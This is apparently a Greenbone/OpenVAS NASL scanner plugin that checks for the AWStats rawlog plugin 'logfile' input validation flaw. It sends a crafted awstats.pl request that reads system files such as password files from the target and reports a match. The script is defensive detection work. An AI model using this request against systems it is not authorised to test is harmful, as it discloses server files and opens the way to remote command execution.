CPE = "cpe:/a:awstats:awstats";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14347" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 10950 );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "AWStats rawlog plugin logfile parameter input validation vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 David Maciejak" );
	script_family( "Web application abuses" );
	script_dependencies( "awstats_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "awstats/installed" );
	script_tag( name: "solution", value: "Upgrade to the latest version of this software" );
	script_tag( name: "summary", value: "The remote host seems to be running AWStats, a free real-time logfile analyzer.

  AWStats Rawlog Plugin is reported prone to an input validation vulnerability." );
	script_tag( name: "impact", value: "An attacker may exploit this condition to execute commands remotely or disclose
  contents of web server readable files." );
	script_tag( name: "insight", value: "The issue is reported to exist because user supplied 'logfile' URI data passed
  to the 'awstats.pl' script is not sanitized." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files( "linux" );
hostname = get_host_name();
for file in keys( files ) {
	url = dir + "/awstats.pl?filterrawlog=&rawlog_maxlines=5000&config=" + hostname + "&framename=main&pluginmode=rawlog&logfile=/" + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

